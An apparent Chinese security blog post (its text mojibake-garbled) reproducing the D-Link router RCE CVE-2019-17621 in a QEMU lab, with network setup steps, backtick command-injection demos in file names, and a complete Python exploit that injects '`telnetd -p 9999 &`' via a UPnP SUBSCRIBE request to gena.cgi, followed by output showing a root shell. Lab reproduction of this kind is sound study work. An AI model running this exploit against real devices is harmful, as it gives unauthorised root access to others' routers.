<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -f <span class="string">&#x27;start&#x27;</span>.sh	<span class="comment">#åˆ é™¤æ–‡ä»¶ &#x27;start&#x27;ï¼ˆæ‰¾ä¸åˆ°ï¼‰ï¼Œç„¶åæ‰§è¡Œ .sh å‘½ä»¤ï¼ˆä¸å­˜åœ¨ï¼‰</span></span><br><span class="line">shell_file=<span class="string">&quot;`id`.sh&quot;</span>	<span class="comment"># å®é™…æ–‡ä»¶åæ˜¯ç±»ä¼¼ï¼š`id`.sh,ä½†æ‰§è¡Œæ—¶ä¼šå…ˆæ‰§è¡Œ id å‘½ä»¤ï¼</span></span><br></pre></td></tr></table></figure>

<p>ä¾‹å­ï¼šæ˜¾ç¤ºæ²¡æœ‰æƒé™æ°æ°è¯´æ˜èƒ½å¤Ÿæ‰§è¡Œ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">lion@lion-virtual-machine:~/æ¡Œé¢/_DIR822A1_FW103WWb03.<span class="built_in">bin</span>.extracted% cat start.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">filename = <span class="string">&quot;`touch /tmp/hacked`.sh&quot;</span>  <span class="comment"># åå¼•å·åœ¨è¿™é‡Œï¼</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;#!/bin/sh\necho test\n&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;rm -f &quot;</span> + filename)  <span class="comment"># è¿™é‡Œä¼šæ‰§è¡Œ touch /tmp/hackedï¼</span></span><br><span class="line"></span><br><span class="line">lion@lion-virtual-machine:~/æ¡Œé¢/_DIR822A1_FW103WWb03.<span class="built_in">bin</span>.extracted% python start.py</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;start.py&quot;</span>, line <span class="number">3</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">FileNotFoundError: [Errno <span class="number">2</span>] No such file <span class="keyword">or</span> directory: <span class="string">&#x27;`touch /tmp/hacked`.sh&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é‚£æˆ‘ä»¬è¯•æƒ³ä¸€ä¸‹ï¼Œè¿™ä¸ª.shæ–‡ä»¶è‹¥åŠ ä¸Šå¼•å·ï¼Œç„¶åç¬¬äºŒæ¬¡fwriteæ—¶ä¼šå…ˆææƒåœ¨åˆ é™¤</p>
<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ä¸‹è½½é“¾æ¥ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mips/">https://people.debian.org/~aurel32/qemu/mips/</a></p>
<p>ä¸‹è½½</p>
<p><img src="/DLink%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E-CVE-2019-17621/1770643090158.png" alt="1770643090158"></p>
<h2 id="mipsç³»ç»Ÿé…ç½®"><a href="#mipsç³»ç»Ÿé…ç½®" class="headerlink" title="mipsç³»ç»Ÿé…ç½®"></a>mipsç³»ç»Ÿé…ç½®</h2><p>è™šæ‹Ÿæœºè¦è®¾ç½®ä¸ºæ¡¥æ¥æ¨¡å¼</p>
<p>è·å–å®‰è£…ä¾èµ–ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹ä¸»æœºç½‘ç»œé…ç½®</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/network/interfaces</span><br></pre></td></tr></table></figure>

<p>å°†å†…å®¹ä¿®æ”¹ä¸º</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># interfaces(5) file used by ifup(8) and ifdown(8)</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet dhcp</span><br><span class="line"></span><br><span class="line"><span class="comment">#auto br0</span></span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">  bridge_ports ens33</span><br><span class="line">  bridge_maxwait <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹ç½‘ç»œæ¥å£è¿æ¥è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/qemu-ifup</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#####################################################</span></span><br><span class="line">echo <span class="string">&quot;Executing /etc/qemu-ifup&quot;</span></span><br><span class="line">echo <span class="string">&quot;Bringing up $1 for bridged mode...&quot;</span></span><br><span class="line">sudo /sbin/ifconfig $<span class="number">1</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> promisc up</span><br><span class="line">echo <span class="string">&quot;Adding $1 to br0...&quot;</span></span><br><span class="line">sudo /sbin/brctl addif br0 $<span class="number">1</span></span><br><span class="line">sleep <span class="number">3</span></span><br><span class="line"><span class="comment">#åœ¨æ–‡ä»¶æœ€åéƒ¨åˆ†è¡¥å……</span></span><br></pre></td></tr></table></figure>

<p>èµ‹äºˆå¯æ‰§è¡Œæƒé™ç„¶åé‡å¯ç½‘ç»œé…ç½®ä½¿å…¶ç”Ÿæ•ˆ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod a+x /etc/qemu-ifup</span><br><span class="line">sudo /etc/init.d/networking restart</span><br></pre></td></tr></table></figure>

<h2 id="æ‰‹åŠ¨ç‰ˆqemuå¯åŠ¨é…ç½®"><a href="#æ‰‹åŠ¨ç‰ˆqemuå¯åŠ¨é…ç½®" class="headerlink" title="æ‰‹åŠ¨ç‰ˆqemuå¯åŠ¨é…ç½®"></a>æ‰‹åŠ¨ç‰ˆqemuå¯åŠ¨é…ç½®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ifdown ens33</span><br><span class="line">sudo ifup br0</span><br></pre></td></tr></table></figure>

<p>åœ¨ä¸‹è½½çš„ä¸¤ä¸ªæ–‡ä»¶çš„ç›®å½•ä¸‹æ‰§è¡Œ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-<span class="number">2.6</span><span class="number">.32</span>-<span class="number">5</span>-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -net nic,macaddr=<span class="number">00</span>:<span class="number">16</span>:3e:<span class="number">00</span>:<span class="number">00</span>:01 -net tap</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸå¯åŠ¨ï¼ç™»é™†è´¦å·&#x2F;å¯†ç ï¼šroot&#x2F;root</p>
<p><img src="/DLink%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E-CVE-2019-17621/1770709728319.png" alt="1770709728319"></p>
<p>ç„¶åæ˜¯çœ‹ç½‘å¡é…ç½®ï¼š<code>ifconfig</code></p>
<p>ç»™ç½‘å¡é™æ€ip</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. å¯åŠ¨eth0ç½‘å¡</span></span><br><span class="line">ifconfig eth0 up</span><br><span class="line"><span class="comment"># 2. é…ç½®IPï¼ˆæ¯”å¦‚192.168.2.200ï¼Œå’Œä¹‹å‰çš„ç¯å¢ƒä¿æŒä¸€è‡´ï¼‰</span></span><br><span class="line">ifconfig eth0 <span class="number">192.168</span><span class="number">.2</span><span class="number">.200</span> netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line"><span class="comment"># 3. éªŒè¯é…ç½®</span></span><br><span class="line">ifconfig eth0</span><br></pre></td></tr></table></figure>

<p>ç”¨æˆ·æœº</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@<span class="number">192.168</span><span class="number">.2</span><span class="number">.200</span></span><br></pre></td></tr></table></figure>

<p>æˆåŠŸï¼ï¼</p>
<p><img src="/DLink%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E-CVE-2019-17621/1770709798353.png" alt="1770709798353"></p>
<p>ç„¶åæ˜¯å°†squashfsâ€”rootæ–‡ä»¶ä¸Šä¼ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r ./squashfs-root root@192.168.2.200:/root/ </span><br></pre></td></tr></table></figure>

<p><img src="/DLink%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E-CVE-2019-17621/1770709945366.png" alt="1770709945366"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot /root/squashfs-root sh</span><br></pre></td></tr></table></figure>

<p><img src="/DLink%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E-CVE-2019-17621/1770710028232.png" alt="1770710028232"></p>
<p>ç„¶ååé¢çš„æˆ‘è¿˜æ²¡ææ˜ç™½ï¼Œå°±å…ˆä¸å†™äº†</p>
<h2 id="è‡ªåŠ¨ç‰ˆè®¿é—®"><a href="#è‡ªåŠ¨ç‰ˆè®¿é—®" class="headerlink" title="è‡ªåŠ¨ç‰ˆè®¿é—®"></a>è‡ªåŠ¨ç‰ˆè®¿é—®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/liyansong2018/firmware-analysis-plus.git</span><br><span class="line">cd firmware-analysis-plus</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>

<p> ä¿®æ”¹ <code>fap.config</code> æ–‡ä»¶ä¸­çš„å¯†ç ï¼Œæ”¹ä¸º <code>root</code> ç³»ç»Ÿç”¨æˆ·çš„å¯†ç  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">yy@yy-virtual-machine:~/firmware-analysis-plus% ./fap.py -q ./qemu-builds/<span class="number">2.5</span><span class="number">.0</span>/ DIR822A1_FW103WWb03.<span class="built_in">zip</span></span><br><span class="line"></span><br><span class="line">             </span><br><span class="line">            ______   _                ___                 </span><br><span class="line">            |  ___| (_)              / _ \                </span><br><span class="line">            | |_     _   _ __ ___   / /_\ \  _ __    ___  </span><br><span class="line">            |  _|   | | | <span class="string">&#x27;_ ` _ \  |  _  | | &#x27;</span>_ \  / __| ++</span><br><span class="line">            | |     | | | | | | | | | | | | | | | | \__ \ </span><br><span class="line">            \_|     |_| |_| |_| |_| \_| |_/ |_| |_| |___/</span><br><span class="line"></span><br><span class="line">            Welcome to the Firmware Analysis Plus - v2<span class="number">.3</span><span class="number">.1</span></span><br><span class="line"> By lys - https://github.com/liyansong2018/firmware-analysis-plus</span><br><span class="line">    </span><br><span class="line">[+] Firmware: DIR822A1_FW103WWb03.<span class="built_in">zip</span></span><br><span class="line">[+] Extracting the firmware...</span><br><span class="line">[+] Image ID: <span class="number">1</span></span><br><span class="line">[+] Identifying architecture...</span><br><span class="line">[+] Architecture: mipseb</span><br><span class="line">[+] Building QEMU disk image...</span><br><span class="line">[+] Setting up the network connection, please standby...</span><br><span class="line">[+] Network interfaces: [(<span class="string">&#x27;br0&#x27;</span>, <span class="string">&#x27;192.168.0.1&#x27;</span>), (<span class="string">&#x27;br1&#x27;</span>, <span class="string">&#x27;192.168.7.1&#x27;</span>)]</span><br><span class="line">[+] Using qemu-system-mips <span class="keyword">from</span> /home/yy/firmware-analysis-plus/qemu-builds/<span class="number">2.5</span><span class="number">.0</span></span><br><span class="line">[+] All <span class="built_in">set</span>! Press ENTER to run the firmware...</span><br><span class="line">[+] When running, press Ctrl + A X to terminate qemu</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/DLink%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E-CVE-2019-17621/1770717993244.png" alt="1770717993244"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./shutdown.py <span class="comment">#å…³é—­ç»ˆç«¯</span></span><br><span class="line">./reset.py <span class="comment">#é‡ç½®å’Œåˆ é™¤ä¸­é—´ä»¶</span></span><br></pre></td></tr></table></figure>

<h2 id="expï¼š"><a href="#expï¼š" class="headerlink" title="expï¼š"></a>expï¼š</h2><p>è¿™ä¸ªexpæ˜¯å°è¯•è¿æ¥åˆ°9999ç«¯å£ï¼Œè¿™ä¸ªè¦rootæƒé™æ‰€ä»¥è¿æ¥ä¸Šäº†å°±è¯´æ˜æˆåŠŸäº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit By Miguel Mendez &amp; Pablo Pollanco</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">httpSUB</span>(<span class="params">server, port, shell_file</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n[*] Connection &#123;host&#125;:&#123;port&#125;&#x27;</span>.<span class="built_in">format</span>(host=server, port=port))  <span class="comment"># ä¿®å¤æ ¼å¼åŒ–è¯­æ³•</span></span><br><span class="line">    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment"># æ„é€ è¯·æ±‚ï¼ˆä¿®å¤Hostå¤´çš„ç«¯å£æ‹¼æ¥é—®é¢˜ï¼‰</span></span><br><span class="line">    request = <span class="string">&quot;SUBSCRIBE /gena.cgi?service=&quot;</span> + <span class="built_in">str</span>(shell_file) + <span class="string">&quot; HTTP/1.0\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Host: &quot;</span> + <span class="built_in">str</span>(server) + <span class="string">&quot;\r\n&quot;</span>  <span class="comment"># ç§»é™¤å¤šä½™çš„portæ‹¼æ¥ï¼ˆHostå¤´ä¸éœ€è¦å¸¦ç«¯å£ï¼‰</span></span><br><span class="line">    request += <span class="string">&quot;Callback: &lt;http://192.168.0.4:34033/ServiceProxy27&gt;\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;NT: upnp:event\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Timeout: Second-1800\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Accept-Encoding: gzip, deflate\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\r\n\r\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Sending Payload&#x27;</span>)</span><br><span class="line">    con.connect((socket.gethostbyname(server), port))</span><br><span class="line">    con.send(request.encode(<span class="string">&#x27;utf-8&#x27;</span>))  <span class="comment"># æ˜ç¡®æŒ‡å®šç¼–ç </span></span><br><span class="line">    results = con.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Response: &#x27;</span>, results.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))  <span class="comment"># æ‰“å°å“åº”ï¼ˆæ–¹ä¾¿æ’é”™ï¼‰</span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Running Telnetd Service&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Opening Telnet Connection\n&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;telnet &#x27;</span> + <span class="built_in">str</span>(server) + <span class="string">&#x27; 9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¸å¿ƒä¿®å¤ï¼šPython3 ä½¿ç”¨ input() æ›¿ä»£ raw_input()</span></span><br><span class="line">serverInput = <span class="built_in">input</span>(<span class="string">&#x27;IP Router: &#x27;</span>)</span><br><span class="line">portInput = <span class="number">49152</span></span><br><span class="line">httpSUB(serverInput, portInput, <span class="string">&#x27;`telnetd -p 9999 &amp;`&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">yy@yy-virtual-machine:~/æ¡Œé¢/<span class="built_in">dir</span>-<span class="number">859</span>% nmap <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">Starting Nmap <span class="number">7.60</span> ( https://nmap.org ) at <span class="number">2026</span>-02-<span class="number">10</span> <span class="number">18</span>:<span class="number">17</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.0063</span>s latency).</span><br><span class="line">Not shown: <span class="number">996</span> closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line"><span class="number">23</span>/tcp    <span class="built_in">open</span>  telnet</span><br><span class="line"><span class="number">80</span>/tcp    <span class="built_in">open</span>  http</span><br><span class="line"><span class="number">443</span>/tcp   <span class="built_in">open</span>  https</span><br><span class="line"><span class="number">49152</span>/tcp <span class="built_in">open</span>  unknown</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">1.26</span> seconds</span><br><span class="line">yy@yy-virtual-machine:~/æ¡Œé¢/<span class="built_in">dir</span>-<span class="number">859</span>% ls</span><br><span class="line"><span class="number">150090.</span>squashfs  debian_squeeze_mips_standard.qcow2  vmlinux-<span class="number">2.6</span><span class="number">.32</span>-<span class="number">5</span>-4kc-malta</span><br><span class="line"><span class="number">2888</span>		 exp.py</span><br><span class="line"><span class="number">2888.7</span>z		 squashfs-root</span><br><span class="line">yy@yy-virtual-machine:~/æ¡Œé¢/<span class="built_in">dir</span>-<span class="number">859</span>% python exp.py</span><br><span class="line">IP Router: <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">[*] Connection <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">49152</span></span><br><span class="line">[*] Sending Payload</span><br><span class="line">[*] Response:  HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Server: WebServer</span><br><span class="line">Date: Sat, 01 Jan <span class="number">2000</span> 02:<span class="number">18</span>:<span class="number">47</span> GMT</span><br><span class="line">SID: uuid:A60289A5-4CC2-<span class="number">726E-9734</span>-2833F182804D</span><br><span class="line">TIMEOUT: Second-<span class="number">1800</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Running Telnetd Service</span><br><span class="line">[*] Opening Telnet Connection</span><br><span class="line"></span><br><span class="line">Trying <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>...</span><br><span class="line">Connected to <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>.</span><br><span class="line">Escape character <span class="keyword">is</span> <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BusyBox v1<span class="number">.14</span><span class="number">.1</span> (<span class="number">2016</span>-<span class="number">12</span>-<span class="number">29</span> <span class="number">16</span>:<span class="number">47</span>:<span class="number">48</span> CST) built-<span class="keyword">in</span> shell (msh)</span><br><span class="line">Enter <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> a <span class="built_in">list</span> of built-<span class="keyword">in</span> commands.</span><br><span class="line"></span><br><span class="line"><span class="comment"># whoani</span></span><br><span class="line">whoani: <span class="keyword">not</span> found</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami: <span class="keyword">not</span> found</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span>: <span class="keyword">not</span> found</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">firmadyne   dev         sbin        tmp         var         lost+found</span><br><span class="line">etc         sys         lib         home        mnt</span><br><span class="line">www         <span class="built_in">bin</span>         usr         proc        htdocs</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="å‚è€ƒè‡´è°¢"><a href="#å‚è€ƒè‡´è°¢" class="headerlink" title="å‚è€ƒè‡´è°¢"></a>å‚è€ƒè‡´è°¢</h1><p> [ã€IOT å­¦ä¹ ä¸‰ã€‘DLinkè·¯ç”±å™¨RCEæ¼æ´ CVE-2019-17621å¤ç° | Loora1Nâ€™s Blog | é¹­é›¨](<a target="_blank" rel="noopener" href="https://loora1n.github.io/2022/09/16/[IOT">https://loora1n.github.io/2022/09/16/[IOT</a> å­¦ä¹ ä¸‰]CVE-2019-17621å¤ç°&#x2F;) </p>
<p> <a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/228726.html">DLink RCEæ¼æ´CVE-2019-17621åˆ†æ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a> </p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="https://hfddh666.github.io">hfddh666</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://hfddh666.github.io/2026/02/09/DLink%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E-CVE-2019-17621/">https://hfddh666.github.io/2026/02/09/DLink%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E-CVE-2019-17621/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº <a href="https://hfddh666.github.io" target="_blank">hfddh666's Blog</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Iot/">Iot</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/02/12/ret2gets/" title="ret2gets"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">ä¸Šä¸€ç¯‡</div><div class="info-item-2">ret2gets</div></div><div class="info-2"><div class="info-item-1">å‰è¨€ä»Šå¤©åˆšå¥½çœ‹åˆ°litctf2025çš„ä¸€é“pwné¢˜ï¼Œæ˜¯ä¸€ç§æˆ‘æ²¡æœ‰è§è¿‡çš„æ–¹æ³•ï¼Œåé¢æŸ¥äº†ä¸€ä¸‹æ˜¯å«åšret2gets,ç„¶åå°±æµ…æµ…çš„å­¦äº†å­¦ã€‚ret2getsé€‚ç”¨äºæ²¡æœ‰pop_rdiè¿™ä¸€ç±»æ§åˆ¶rdiæ—¶ä½¿ç”¨çš„æ–¹æ³• æºç 123456789101112#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() &#123;    puts(&quot;ret2gets&amp;ret2system&quot;);    char buffer[0x20];      gets(buffer);          return 0;&#125;void backdoor() &#123;    system(&quot;echo hi&quot;); &#125;//æ‰§è¡Œgcc -o ret2system ret2system.c -fno-stack-protector -z execstack -no-pie -fno-picç”Ÿæˆæ–‡ä»¶  ret2systemexp 12345678910111213from pwn import *c...</div></div></div></a><a class="pagination-related" href="/2026/02/09/python%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/" title="pythonå‰ç«¯å¼€å‘"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">ä¸‹ä¸€ç¯‡</div><div class="info-item-2">pythonå‰ç«¯å¼€å‘</div></div><div class="info-2"><div class="info-item-1">HTMLä¸€.å…ˆå¼€å‘ä¸€ä¸ªå°ç½‘é¡µ1234567from flask import Flaskapp=Flask(__name__)@app.route(&quot;/show/bin&quot;)def hello():	return &quot;helloworld!!!&quot;if __name__==&#x27;__main__&#x27;:	app.run()   12&lt;h1&gt;a&lt;/h1&gt;	--&gt;åŠ å¤§åŠ ç²—&lt;span style=&quot;color:red;&quot;&gt;a&lt;/span&gt;	--&gt;å˜ä¸ºçº¢è‰²  